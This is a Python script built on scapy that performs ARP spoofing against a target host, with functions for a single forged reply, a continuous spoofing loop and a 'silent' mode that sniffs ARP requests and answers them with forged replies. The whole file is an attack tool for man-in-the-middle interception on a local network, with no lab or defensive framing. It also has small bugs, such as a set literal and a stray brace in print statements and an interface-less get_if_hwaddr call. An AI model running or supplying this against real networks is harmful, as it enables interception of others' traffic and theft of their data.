import scapy.all as sc
import threading
import time

def send_spoof_packet(target_ip, spoofed_ip):
    """
    Send a spoofing packet
    """
    packet = sc.ARP(op=2, pdst=target_ip, psrc=spoofed_ip)
    sc.send(packet, verbose=False)

def continuous_arp_spoof(target_ip, spoofed_ip, interval):
    """
    start a loop that continuously sends spoofing packets, interval in seconds
    """
    try:
        print("starting contiuous arp spoof from %s to %s with interval %d seconds" % (target_ip, spoofed_ip, interval))
        packet = sc.ARP(op=2, pdst=target_ip, psrc=spoofed_ip)
        sc.send(packet, inter=interval, loop=True)
    except KeyboardInterrupt:
        print("stopping continuous ARP spoofing")

def silent_arp_spoof(target_ip, spoofed_ip):
    print("starting silent arp spoof of %s to %s" % (target_ip, spoofed_ip))

    def handle_arp_packet(packet):
        if packet.haslayer(sc.ARP) and packet[sc.ARP].op == 1:
            if packet[sc.ARP].psrc == target_ip and packet[sc.ARP].pdst == spoofed_ip:
                print("got arp request from %s to %s}" % (target_ip, spoofed_ip))
                send_spoof_packet(target_ip, spoofed_ip)
                print("Send spoofed packet: %s is at %s" % (spoofed_ip, sc.get_if_hwaddr()))
            elif packet[sc.ARP].psrc == spoofed_ip and packet[sc.ARP].pdst == target_ip:
                print("caught arp request from %s to %s, ignoring" % ({spoofed_ip}, target_ip))

    try:
        sc.sniff(filter="arp", prn=handle_arp_packet, store=0)
    except KeyboardInterrupt:
        print("Stopping silent ARP spoofing")
